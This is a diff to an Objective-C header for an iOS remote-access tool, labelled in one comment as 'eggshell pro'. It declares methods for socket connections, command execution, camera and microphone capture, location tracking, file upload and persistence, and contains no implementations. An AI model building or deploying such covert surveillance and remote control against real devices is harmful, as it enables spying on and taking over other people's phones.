@@ -12,16 +12,14 @@
 #include "SpringBoardServices/SpringBoardServices.h"
 #import <UIKit/UIKit.h>
 
-@interface espl:NSObject {
-    NSString *TERM;
-}
-
+@interface espl:NSObject
 @property (nonatomic,strong) AVCaptureSession *session;
 @property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
 @property (retain) AVAudioRecorder *recorder;
 @property (retain) NSFileManager *fileManager;
 @property (retain) UIDevice *thisUIDevice;
 @property (retain) NSString *skey;
+@property (retain) NSString *terminator;
 @property (retain) CPDistributedMessagingCenter *messagingCenter;
 
 //socks
@@ -29,7 +27,7 @@ extern int sockfd;
 -(int)connect:(NSString*)host
              :(long)port;
 -(void)sendData:(NSData *)data;
--(void)sendString:(NSString *)string :(NSString *)key;
+-(void)sendString:(NSString *)string;
 
 //convenience
 -(NSString *)forgetFirst:(NSArray *)args;
@@ -56,7 +54,6 @@ extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean su
 extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)locate;
 -(void)exec:(NSString *)command;
--(void)receiveDYLIB;
 -(void)vibrate;
 -(void)say:(NSString *)string;
 -(void)displayalert:(const char *)title :(const char *)message;
@@ -68,14 +65,16 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)getVolume;
 -(void)isplaying;
 -(void)listapps;
--(void)battery;
+-(NSString *)battery;
+-(void)sysinfo;
 -(void)launchApp:(NSArray *)args;
 -(void)persistence:(NSString *)ip :(int)port;
 -(void)rmpersistence;
 
 //eggshell pro
--(void)mcSendNoReply:(NSString *)message;
--(void)mcSendYesReply:(NSString *)message;
+-(void)upload:(int)size :(NSString *)uploadpath;
+-(void)mcSendNoReply:(NSString *)command;
+-(void)mcSendYesReply:(NSString *)command;
 -(void)locationService:(NSArray *)args;
 
 @end
